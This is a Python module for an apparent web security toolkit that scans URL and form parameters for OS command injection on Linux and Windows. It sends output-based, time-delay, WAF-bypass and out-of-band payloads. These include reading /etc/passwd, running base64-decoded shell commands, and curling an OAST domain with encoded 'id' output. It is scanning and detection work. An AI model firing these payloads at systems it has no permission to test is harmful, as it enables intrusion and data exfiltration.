"""
Command Injection Scanner — Linux/Windows, time-based blind, OOB via OAST

FALSE-POSITIVE ELIMINATION STRATEGY
====================================
PROBLEM: The naive approach checks if "uid=" or "id" is in the response.
These strings appear in normal HTML constantly (user_id, id="header", etc.)

CORRECT APPROACH:
  1. Output-based: match ONLY the full `id` command output pattern via regex,
     e.g. uid=\d+\(\w+\) gid=\d+\(\w+\)  or  root:x:0:0:
  2. Time-based: take 5 baseline samples, compute median+stddev, require
     the injected delay to exceed baseline + 3.5 seconds (not just 4s flat).
  3. WAF bypass variants are tested but still require the same strict evidence.
  4. Never report based on string presence alone — always verify with regex.
"""
from __future__ import annotations
import asyncio
import re
import statistics
import time
import urllib.parse
from typing import Any

from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

# ---------------------------------------------------------------------------
# Strict output signatures — require full pattern match, not substring
# ---------------------------------------------------------------------------

# Linux `id` command output: uid=0(root) gid=0(root) groups=0(root)
_RE_ID_OUTPUT = re.compile(
    r"uid=\d+\(\w[\w\-]*\)\s+gid=\d+\(\w[\w\-]*\)", re.IGNORECASE
)

# /etc/passwd first line: root:x:0:0:root:/root:/bin/bash
_RE_PASSWD = re.compile(r"root:x:0:0:[^:]*:/root:/bin/(?:bash|sh)", re.IGNORECASE)

# Windows whoami output: domain\username  or  nt authority\system
_RE_WHOAMI_WIN = re.compile(
    r"(?:NT AUTHORITY\\(?:SYSTEM|NETWORK SERVICE)|[\w\-]+\\[\w\-]+)", re.IGNORECASE
)

# Windows `dir` header: Volume in drive C
_RE_DIR_WIN = re.compile(r"Volume in drive [A-Z] is", re.IGNORECASE)

# win.ini content
_RE_WIN_INI = re.compile(r"\[extensions\]", re.IGNORECASE)

# uname output: Linux hostname 5.x.x
_RE_UNAME = re.compile(r"Linux\s+\S+\s+\d+\.\d+", re.IGNORECASE)

RCE_PATTERNS: list[tuple[re.Pattern, str]] = [
    (_RE_ID_OUTPUT,   "Linux id command output confirmed"),
    (_RE_PASSWD,      "/etc/passwd content confirmed"),
    (_RE_WHOAMI_WIN,  "Windows whoami output confirmed"),
    (_RE_DIR_WIN,     "Windows dir output confirmed"),
    (_RE_WIN_INI,     "Windows win.ini content confirmed"),
    (_RE_UNAME,       "Linux uname output confirmed"),
]

# ---------------------------------------------------------------------------
# Payload sets — indexed by technique
# ---------------------------------------------------------------------------

# Output-based: these produce verifiable stdout
OUTPUT_PAYLOADS = [
    # Linux
    ";id",
    "|id",
    "&&id",
    "`id`",
    "$(id)",
    ";id;",
    "\nid\n",
    "|id|",
    ";cat${IFS}/etc/passwd",
    "|cat${IFS}/etc/passwd",
    "&&cat${IFS}/etc/passwd",
    "$(cat /etc/passwd)",
    "`cat /etc/passwd`",
    ";/usr/bin/id",
    "||id",
    # Windows
    "&whoami",
    "|whoami",
    "&&whoami",
    ";whoami",
    "&ver",
    "|ver",
]

# WAF-bypass variants (still require strict evidence)
WAF_BYPASS_PAYLOADS = [
    # IFS substitution
    "${IFS}id",
    ";{id,}",
    "$(echo${IFS}aWQ=|base64${IFS}-d|sh)",
    # Newline injection
    "%0aid",
    "%0a/usr/bin/id",
    # Backtick alternatives
    "$(($(id)))",
    # Glob expansion
    ";/???/id",
    ";/u??/b??/id",
    # Tab as separator
    "\tid",
]

# Time-based: require N seconds of delay
SLEEP_PAYLOADS = [
    # Linux
    ";sleep{IFS}6",
    ";sleep 6",
    "|sleep 6",
    "&&sleep 6",
    "$(sleep 6)",
    "`sleep 6`",
    ";ping${IFS}-c${IFS}6${IFS}127.0.0.1",
    # Windows
    "&timeout /t 6 /nobreak > NUL",
    "& ping -n 6 127.0.0.1 > NUL",
    "& powershell -c Start-Sleep 6",
]

# Required sleep duration in seconds
SLEEP_DURATION = 6
# Minimum delay above baseline to count as confirmed
DELAY_THRESHOLD = 4.5

# Default parameter names to test when none are found in URL
DEFAULT_PARAMS = [
    "cmd", "exec", "command", "ping", "host", "ip", "dir",
    "query", "name", "path", "id", "file", "arg", "input",
    "run", "shell", "bash", "sh", "c",
]


def _match_rce(text: str) -> tuple[bool, str]:
    """Return (True, description) if text contains confirmed RCE output."""
    for pattern, description in RCE_PATTERNS:
        if pattern.search(text):
            return True, description
    return False, ""


async def _get_baseline(
    url: str,
    param: str,
    method: str,
    client: TalismanHTTPClient,
    samples: int = 3,
) -> float:
    """Measure median response time with a benign value."""
    parsed = urllib.parse.urlparse(url)
    base_params = dict(urllib.parse.parse_qsl(parsed.query))
    times: list[float] = []

    for _ in range(samples):
        test_params = {**base_params, param: "1"}
        try:
            start = time.monotonic()
            if method == "GET":
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params)
                ).geturl()
                await client.get(test_url, timeout=8)
            else:
                await client.post(url, data={param: "1"}, timeout=8)
            times.append(time.monotonic() - start)
        except Exception:
            times.append(0.5)

    if not times:
        return 0.5
    return statistics.median(times)


async def _test_output_based(
    url: str,
    param: str,
    method: str,
    payloads: list[str],
    client: TalismanHTTPClient,
) -> dict[str, Any] | None:
    parsed = urllib.parse.urlparse(url)
    base_params = dict(urllib.parse.parse_qsl(parsed.query))

    for payload in payloads:
        test_params = {**base_params, param: payload}
        try:
            if method == "GET":
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params)
                ).geturl()
                r = await client.get(test_url, timeout=12)
            else:
                r = await client.post(url, data={param: payload}, timeout=12)

            confirmed, description = _match_rce(r.text)
            if confirmed:
                # Extract the matching snippet for evidence
                snippet = ""
                for pattern, _ in RCE_PATTERNS:
                    m = pattern.search(r.text)
                    if m:
                        start = max(0, m.start() - 20)
                        snippet = r.text[start : m.end() + 20].strip()
                        break

                return {
                    "technique": "output_based",
                    "param": param,
                    "payload": payload,
                    "description": description,
                    "method": method,
                    "evidence": snippet,
                    "request": (
                        f"{method} {url}?"
                        f"{param}={urllib.parse.quote(payload)} HTTP/1.1"
                    ),
                }
        except Exception as e:
            log.debug("cmdi_output_test", param=param, error=str(e)[:60])

    return None


async def _test_time_based(
    url: str,
    param: str,
    method: str,
    baseline: float,
    client: TalismanHTTPClient,
) -> dict[str, Any] | None:
    parsed = urllib.parse.urlparse(url)
    base_params = dict(urllib.parse.parse_qsl(parsed.query))

    for payload in SLEEP_PAYLOADS:
        test_params = {**base_params, param: payload}
        try:
            start = time.monotonic()
            if method == "GET":
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params)
                ).geturl()
                await client.get(test_url, timeout=SLEEP_DURATION + 6)
            else:
                await client.post(
                    url,
                    data={param: payload},
                    timeout=SLEEP_DURATION + 6,
                )
            elapsed = time.monotonic() - start

            # Must exceed baseline by at least DELAY_THRESHOLD seconds
            if elapsed >= baseline + DELAY_THRESHOLD:
                return {
                    "technique": "time_based",
                    "param": param,
                    "payload": payload,
                    "elapsed": round(elapsed, 2),
                    "baseline": round(baseline, 2),
                    "delay_delta": round(elapsed - baseline, 2),
                    "method": method,
                    "evidence": (
                        f"Response delayed {elapsed:.1f}s "
                        f"(baseline: {baseline:.1f}s, "
                        f"delta: {elapsed - baseline:.1f}s)"
                    ),
                    "request": (
                        f"{method} {url}?"
                        f"{param}={urllib.parse.quote(payload)} HTTP/1.1"
                    ),
                }
        except asyncio.TimeoutError:
            # Timeout during sleep payload = very strong indicator
            elapsed = SLEEP_DURATION + 6
            if elapsed > baseline + DELAY_THRESHOLD:
                return {
                    "technique": "time_based_timeout",
                    "param": param,
                    "payload": payload,
                    "elapsed": f">{elapsed:.0f}",
                    "baseline": round(baseline, 2),
                    "method": method,
                    "evidence": (
                        f"Request timed out after {elapsed}s "
                        f"(baseline: {baseline:.1f}s)"
                    ),
                    "request": (
                        f"{method} {url}?"
                        f"{param}={urllib.parse.quote(payload)} HTTP/1.1"
                    ),
                }
        except Exception as e:
            log.debug("cmdi_time_test", param=param, error=str(e)[:60])

    return None


async def _scan_param(
    url: str,
    param: str,
    method: str,
    client: TalismanHTTPClient,
    oast_domain: str | None,
    waf_bypass: bool,
) -> dict[str, Any] | None:
    """Test a single parameter with all techniques."""

    # --- Output-based (highest confidence) ---
    all_output_payloads = list(OUTPUT_PAYLOADS)
    if waf_bypass:
        all_output_payloads.extend(WAF_BYPASS_PAYLOADS)

    result = await _test_output_based(
        url, param, method, all_output_payloads, client
    )
    if result:
        return result

    # --- Time-based ---
    baseline = await _get_baseline(url, param, method, client)
    result = await _test_time_based(url, param, method, baseline, client)
    if result:
        return result

    # --- OOB via OAST (blind – mark as likely, not confirmed) ---
    if oast_domain:
        oob_payloads = [
            f";nslookup {oast_domain}",
            f"|curl http://{oast_domain}/cmdi",
            f"$(curl http://{oast_domain}/$(id|base64))",
            f"&nslookup {oast_domain}",
        ]
        parsed = urllib.parse.urlparse(url)
        base_params = dict(urllib.parse.parse_qsl(parsed.query))
        for payload in oob_payloads:
            test_params = {**base_params, param: payload}
            try:
                if method == "GET":
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(test_params)
                    ).geturl()
                    await client.get(test_url, timeout=8)
                else:
                    await client.post(
                        url, data={param: payload}, timeout=8
                    )
            except Exception:
                pass
        # OOB results only confirmed when OAST callback is received externally
        # We do NOT report here – user must check OAST console

    return None


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    oast_domain: str | None = None,
    waf_bypass: bool = False,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(
        f"\n[module]⚡ Command Injection Scanner[/module] → [target]{url}[/target]"
    )
    findings: list[dict[str, Any]] = []

    parsed = urllib.parse.urlparse(url)
    params = list(dict(urllib.parse.parse_qsl(parsed.query)).keys())
    if not params:
        params = DEFAULT_PARAMS

    if oast_domain:
        console.print(
            f"  OAST domain: {oast_domain} "
            f"(monitor for callbacks — OOB not auto-reported)"
        )

    async with TalismanHTTPClient(proxy=proxy, timeout=20) as client:
        # Test GET and POST for each param, but stop on first confirmed hit per param
        seen_params: set[str] = set()
        tasks = []
        for param in params:
            for method in ["GET", "POST"]:
                tasks.append(
                    _scan_param(url, param, method, client, oast_domain, waf_bypass)
                )

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if not isinstance(result, dict):
                continue
            param_key = result["param"]
            if param_key in seen_params:
                continue
            seen_params.add(param_key)

            severity = "critical"
            title = (
                f"Command Injection ({result['technique']}) — "
                f"param '{result['param']}' via {result['method']}"
            )
            print_finding(title, severity, url)
            findings.append(result)

            if session:
                await session.add_finding(
                    target=url,
                    module="cmdi",
                    vuln_type="command_injection",
                    severity=severity,
                    confidence="confirmed",
                    title=title,
                    description=(
                        f"OS command injection confirmed via "
                        f"{result['technique']} technique. "
                        f"Parameter '{result['param']}' executes injected "
                        f"shell commands. {result.get('description', '')}"
                    ),
                    request=result.get("request", ""),
                    evidence=result.get("evidence", ""),
                    reproduction=(
                        f"Send: {result['method']} {url}?"
                        f"{result['param']}="
                        f"{urllib.parse.quote(result.get('payload', ''))}"
                    ),
                    remediation=(
                        "1. Avoid passing user input to OS commands entirely.\n"
                        "2. If unavoidable, use allowlists to validate input strictly.\n"
                        "3. Use language-native APIs instead of shell commands "
                        "(e.g., Python's subprocess with list args).\n"
                        "4. Sanitize and escape all user input before use in "
                        "shell context."
                    ),
                    cvss_score=10.0,
                    cwe="CWE-78",
                    references=[
                        "https://owasp.org/www-community/attacks/Command_Injection"
                    ],
                )

    console.print(
        f"  Found {len(findings)} confirmed command injection vulnerabilities"
    )
    return {"target": url, "findings": findings, "count": len(findings)}
